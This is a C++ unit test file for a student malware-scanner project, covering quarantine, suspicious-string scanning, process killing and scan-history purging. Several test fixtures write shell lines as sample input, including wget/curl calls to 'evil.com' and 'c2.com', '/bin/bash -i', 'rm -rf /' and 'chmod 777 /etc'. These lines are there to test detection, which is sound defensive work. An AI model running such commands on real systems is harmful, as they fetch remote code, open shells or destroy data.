// =============================================================================
// Unit Tests for Cyber Capstone Project (5 tests)
//
// Build:
//   g++ -std=c++17 test_capstone_5.cpp file_scanner.cpp ScanHistoryManager.cpp \
//       -lgtest -lgtest_main -pthread -o test_capstone_5
//   ./test_capstone_5
// =============================================================================

#include <gtest/gtest.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>

#include "file_scanner.cpp"
#include "ScanHistoryManager.h"

namespace fs = std::filesystem;

// Helper: creates a temp file and auto-deletes it when out of scope
struct TempFile {
    std::string path;
    TempFile(const std::string& name, const std::string& content)
        : path("/tmp/capstone_test_" + name) {
        std::ofstream(path) << content;
    }
    ~TempFile() { fs::remove(path); }
};

// -----------------------------------------------------------------------------
// Test 1: BubblewrapQuarantine — quarantine, list, and delete a file
// -----------------------------------------------------------------------------

// quarantine.cpp defines its own main(); strip it out before including
#define main quarantine_main
#include "quarantine.cpp"
#undef main

TEST(Quarantine, QuarantineListAndDelete) {
    std::string qdir = "/tmp/capstone_qtest_dir";
    std::string qlog = "/tmp/capstone_qtest.log";
    fs::remove_all(qdir);

    BubblewrapQuarantine q(qdir, qlog);

    // Create a temp file to quarantine
    TempFile victim("victim.sh", "#!/bin/bash\necho evil\n");

    // Quarantine it — should succeed and remove the original
    EXPECT_TRUE(q.quarantineFile(victim.path, "test reason"));
    EXPECT_FALSE(fs::exists(victim.path));  // original removed

    // At least one file should now be in the quarantine dir
    int count = 0;
    for (const auto& e : fs::directory_iterator(qdir))
        if (e.path().extension() != ".metadata") count++;
    EXPECT_GE(count, 1);

    // Quarantining a non-existent file should fail gracefully
    EXPECT_FALSE(q.quarantineFile("/tmp/no_such_file_xyz.sh"));

    fs::remove_all(qdir);
    fs::remove(qlog);
}

// -----------------------------------------------------------------------------
// Test 2: scan_suspicious_strings() — commented-out strings are ignored
// -----------------------------------------------------------------------------
TEST(ScanSuspiciousStrings, CommentedLinesNotCounted) {
    TempFile f("commented.sh",
               "# /bin/bash -i\n"
               "# wget http://evil.com\n"
               "// system(\"rm -rf /\");\n");
    EXPECT_EQ(scan_suspicious_strings(f.path), 0);
}

// -----------------------------------------------------------------------------
// Test 3a: scan_file() — clean file returns 1
// -----------------------------------------------------------------------------
TEST(ScanFile, CleanFileReturnsOne) {
    TempFile clean("clean.sh", "#!/bin/bash\necho Hello\n");
    EXPECT_EQ(scan_file(clean.path), 1);
}

// -----------------------------------------------------------------------------
// Test 3b: scan_file() — suspicious file returns 2
// -----------------------------------------------------------------------------
TEST(ScanFile, SuspiciousFileReturnsTwo) {
    TempFile suspicious("suspicious.sh",
                        "/bin/bash -i\nwget http://evil.com\nchmod +x x\n");
    EXPECT_EQ(scan_file(suspicious.path), 2);
}

// -----------------------------------------------------------------------------
// Test 3c: scan_file() — malicious file returns 3
// -----------------------------------------------------------------------------
TEST(ScanFile, MaliciousFileReturnsThree) {
    TempFile malicious("malicious.sh",
                       "/bin/bash -i\nwget http://evil.com\ncurl http://c2.com\n"
                       "chmod 777 /etc\nexec(cmd)\neval(code)\n");
    EXPECT_EQ(scan_file(malicious.path), 3);
}

// -----------------------------------------------------------------------------
// Test 4: kill_process() — kills a real process and confirms it's gone
// -----------------------------------------------------------------------------
#include "kill_process.h"
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <csignal>

TEST(KillProcess, KillsLiveProcess) {
    // Spawn a real dummy process (sleep 60)
    pid_t pid = fork();
    ASSERT_NE(pid, -1);  // fork must succeed

    if (pid == 0) {
        // Child: sleep silently
        execlp("sleep", "sleep", "60", nullptr);
        _exit(1);
    }

    // Give the child a moment to start
    usleep(50000);

    // Kill it — should return 0 (success)
    EXPECT_EQ(kill_process(pid), 0);

    // Wait for the OS to reap the process, then clean up
    waitpid(pid, nullptr, 0);

    // Confirm the process is actually dead
    int result = kill(pid, 0);  // signal 0 = just check if process exists
    EXPECT_EQ(result, -1);      // -1 means it no longer exists
}

TEST(KillProcess, FailsOnInvalidPid) {
    // PID 99999999 almost certainly doesn't exist
    EXPECT_EQ(kill_process(99999999), -1);
}

// -----------------------------------------------------------------------------
// Test 5: ScanHistoryManager — search, filter, and 90-day purge
// -----------------------------------------------------------------------------
TEST(ScanHistoryManager, SearchFilterAndPurge) {
    ScanHistoryManager mgr;

    // Add a recent record with a threat
    Threat t;
    t.name     = "Trojan.Dropper";
    t.filePath = "/tmp/evil.sh";

    ScanRecord recent;
    recent.scanType    = "quick";
    recent.timestamp   = std::chrono::system_clock::now();
    recent.threats     = {t};
    mgr.addRecord(recent);

    // Add an old record (91 days ago) — should be purged
    ScanRecord old;
    old.scanType  = "full";
    old.timestamp = std::chrono::system_clock::now() - std::chrono::hours(24 * 91);
    mgr.addRecord(old);

    // Only the recent record should be visible
    EXPECT_EQ(mgr.getAllVisible().size(), 1u);

    // Search by threat name (case-insensitive)
    EXPECT_EQ(mgr.search("trojan", "", false).size(), 1u);
    EXPECT_EQ(mgr.search("TROJAN", "", false).size(), 1u);

    // Filter: onlyWithThreats
    EXPECT_EQ(mgr.search("", "", true).size(), 1u);

    // Search for something that doesn't exist
    EXPECT_TRUE(mgr.search("ransomware", "", false).empty());
}
